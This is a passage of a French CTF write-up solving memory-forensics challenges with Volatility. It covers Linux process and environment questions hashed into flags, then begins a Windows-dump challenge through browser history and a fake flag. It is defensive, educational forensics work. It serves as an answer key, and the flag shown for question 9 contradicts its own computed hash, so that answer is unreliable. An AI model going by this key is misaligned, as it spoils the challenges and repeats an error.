&lt;p&gt;&lt;strong&gt;Question n°8&lt;/strong&gt;: Quelle est la commande entière du pid 364?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_psaux&lt;/code&gt;- Gathers processes along with full command line and start time&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_psaux | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'haveged'&lt;/span&gt;
Pid    Uid    Gid    Arguments
364    0      0      /usr/sbin/haveged &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 1024 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/usr/sbin/haveged -w 1024 -v 0 -F'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
4c0bed3d6381e2014d77a35e6931d604e4bd8ec1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{4c0bed3d6381e2014d77a35e6931d604e4bd8ec1}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°9&lt;/strong&gt;: Quel est l’invocation ID de bash ?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_psenv&lt;/code&gt;- Gathers processes along with their static environment variables&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_psenv
Name   Pid    Environment
...
bash   1498   &lt;span class=&quot;nv&quot;&gt;LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/bin:/bin:/usr/bin &lt;span class=&quot;nv&quot;&gt;INVOCATION_ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;d6dd8e717833428bac595d565958fdf4 &lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux &lt;span class=&quot;nv&quot;&gt;JOURNAL_STREAM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9:21427 &lt;span class=&quot;nv&quot;&gt;LANGUAGE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_CTYPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_NUMERIC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_TIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_COLLATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_MONETARY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_MESSAGES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_PAPER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_NAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_TELEPHONE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_MEASUREMENT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LC_IDENTIFICATION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/noraj &lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;noraj &lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/bash &lt;span class=&quot;nv&quot;&gt;MAIL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/mail/noraj &lt;span class=&quot;nv&quot;&gt;LOGNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;noraj &lt;span class=&quot;nv&quot;&gt;XDG_SESSION_ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;XDG_RUNTIME_DIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/run/user/1000 &lt;span class=&quot;nv&quot;&gt;XDG_SEAT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;seat0 &lt;span class=&quot;nv&quot;&gt;XDG_VTNR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d6dd8e717833428bac595d565958fdf4'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
a64603f7b14cdd948ab9f065befc350854e0a25d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{4c0bed3d6381e2014d77a35e6931d604e4bd8ec1}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°10&lt;/strong&gt;: Quel est le PPID of &lt;code class=&quot;highlighter-rouge&quot;&gt;qmgr&lt;/code&gt; process?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_pslist&lt;/code&gt;- Gather active tasks by walking the task_struct-&amp;gt;task list&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_pslist
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
0xffff88000a6f2180 qmgr                 1371            1368            51              51     0x000000000d35c000 2019-11-19 22:53:07 UTC+0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1368'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
570722b44ec7003126d686b70703051e72ff7408
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{570722b44ec7003126d686b70703051e72ff7408}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;je-rim-et-je-ram&quot;&gt;Je rim et je ram&lt;/h1&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;Auteur: jenaye&lt;/p&gt;

&lt;p&gt;Difficulté estimée : facile&lt;/p&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;J’ai l’impression que le propriétaire de l’ordi fait encore des trucs bizarres.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Si vous avez trouvé un flag trivial c’est un fake flag !&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;résolution-1&quot;&gt;Résolution&lt;/h3&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file yolo2.raw
yolo2.raw: ELF 64-bit LSB core file x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; ./yolo2.raw | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Linux version'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sh&lt;/span&gt; yolo2.raw
1,1G    yolo2.raw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aucune trace de la chaine &lt;code class=&quot;highlighter-rouge&quot;&gt;Linux version&lt;/code&gt;dans ce dump, il s’agit peut-être d’un dump Windows.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ìmageinfo&lt;/code&gt;- Identify information for the image&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw imageinfo
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : Win2008SP2x64, VistaSP2x64, VistaSP1x64, Win2008SP1x64
                     AS Layer1 : WindowsAMD64PagedMemory &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Kernel AS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                     AS Layer2 : VirtualBoxCoreDumpElf64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unnamed AS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                     AS Layer3 : FileAddressSpace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/home/adel/ctf/sigsegv/forensic_je_rim_et_je_ram/yolo2.raw&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                      PAE &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; : No PAE
                           DTB : 0x124000L
                          KDBG : 0xf80001988f20L
          Number of Processors : 1
     Image Type &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Service Pack&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 2
                KPCR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CPU 0 : 0xfffff8000198a500L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image &lt;span class=&quot;nb&quot;&gt;date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2019-11-14 23:06:11 UTC+0000
     Image &lt;span class=&quot;nb&quot;&gt;local date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2019-11-15 00:06:11 +0100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons bien un dump Windows, les profils conseillés sont &lt;code class=&quot;highlighter-rouge&quot;&gt;Win2008SP2x64, VistaSP2x64, VistaSP1x64, Win2008SP1x64&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pslist&lt;/code&gt;- Print all running processes by following the EPROCESS lists&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 pslist
Offset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;V&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          Name                    PID   PPID   Thds     Hnds   Sess  Start                          
&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;
...
0xfffffa8001222c10 iexplore.exe     2284   3016     18      710      1      1 21:37:58
0xfffffa8003f1f760 notepad.exe       156   2748      1       51      1      0 22:40:37
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut voir 2 processus intéressants, une instance d’Internet Explorer et une autre de Notepad.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;internet-explorer&quot;&gt;Internet Explorer&lt;/h2&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iehistory&lt;/code&gt;- Reconstruct Internet Explorer cache / history&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 iehistory
...
&lt;span class=&quot;k&quot;&gt;**************************************************&lt;/span&gt;
Process: 844 svchost.exe
Cache &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;URL &quot;&lt;/span&gt; at 0x135d2200
Record length: 0x100
Location: :2019111520191116: sigsegv@http://10.0.2.2:8000/url.log
Last modified: 2019-11-15 00:00:58 UTC+0000
Last accessed: 2019-11-14 23:00:58 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
&lt;span class=&quot;k&quot;&gt;**************************************************&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La sortie de la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;iehistory&lt;/code&gt;étant très longue, nous allons commencer par filtrer sur le motif &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 iehistory | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ioE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http.*'&lt;/span&gt;
...
https://www.google.fr/?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;https://cryptobin.co/71q7y462
...
https://www.google.fr/search?hl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fr&amp;amp;source&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hp&amp;amp;biw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;bih&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;https%3A%2F%2Fprivatebin.net%2F%3F9d8a660cfd4f182f%23HK8pYJaHwjMWJaWRx3zvr81uHE5drHTHw61NqHeXXsib&amp;amp;btnG&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Recherche+Google&amp;amp;iflsig&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AAP1E1EAAAAAXc6smtsHa_VLLEJu4aNDlsItMaA0O13F&amp;amp;gbv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut voir 2 recherches Google intéressantes dans l’historique de navigation:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://cryptobin.co&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://privatebin.net&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ces 2 sites sont similaires à &lt;code class=&quot;highlighter-rouge&quot;&gt;pastbin.com&lt;/code&gt;, la seule différence est que les notes sont chiffrées et qu’il faut donc un mot de passe pour accéder à la note partagée.&lt;/p&gt;

&lt;p&gt;Sur &lt;code class=&quot;highlighter-rouge&quot;&gt;https://cryptobin.co/71q7y462&lt;/code&gt;, nous avons des données en &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; que nous devons déchiffrer.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'eyJpdiI6IkVXWlVOY0trNDN6YXlZb3VtZVFPa2c9PSIsInYiOjEsIml0ZXIiOjEwMDAsImtzIjoyNTYsInRzIjo2NCwibW9kZSI6ImNjbSIsImFkYXRhIjoiIiwiY2lwaGVyIjoiYWVzIiwic2FsdCI6InJjQXVrZXAwbEdvPSIsImN0IjoiYTN5SWpoWG9YNDA4M2lyZzk5SURTWHVEUjg2elRsT0VMTGlCWmVNRSJ9'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;iv&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;EWZUNcKk43zayYoumeQOkg==&quot;&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;v&quot;&lt;/span&gt;:1,
  &lt;span class=&quot;s2&quot;&gt;&quot;iter&quot;&lt;/span&gt;:1000,
  &lt;span class=&quot;s2&quot;&gt;&quot;ks&quot;&lt;/span&gt;:256,
  &lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;:64,
  &lt;span class=&quot;s2&quot;&gt;&quot;mode&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;ccm&quot;&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;adata&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;cipher&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;aes&quot;&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;salt&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;rcAukep0lGo=&quot;&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;ct&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;a3yIjhXoX4083irg99IDSXuDR86zTlOELLiBZeME&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sur &lt;code class=&quot;highlighter-rouge&quot;&gt;https://privatebin.net/?9d8a660cfd4f182f#HK8pYJaHwjMWJaWRx3zvr81uHE5drHTHw61NqHeXXsib&lt;/code&gt;, nous devons aussi fournir un mot de passe pour accéder aux données. Nous devons peut-être trouver ce mot de passe dans le dump.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;flag-trivial&quot;&gt;Flag trivial&lt;/h2&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;filescan&lt;/code&gt;- Pool scanner for file objects&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 filescan | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\\sigsegv'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AppData'&lt;/span&gt;
...
0x000000001bf0ff20     15      0 RW-rw- &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;igsegv&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On remarque un fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;dans l’espace de l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv&lt;/code&gt;. Essayons de dumper le fichier grace à son offset.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dumpfiles&lt;/code&gt; - Extract memory mapped and cached files&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000001bf0ff20 &lt;span class=&quot;nt&quot;&gt;--dump-dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
DataSectionObject 0x1bf0ff20   None   &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;igsegv&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file file.None.0xfffffa8005f4da30.dat
file.None.0xfffffa8005f4da30.dat: ASCII text, with no line terminators

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file.None.0xfffffa8005f4da30.dat
sigsevg&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;MySuperFlag&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

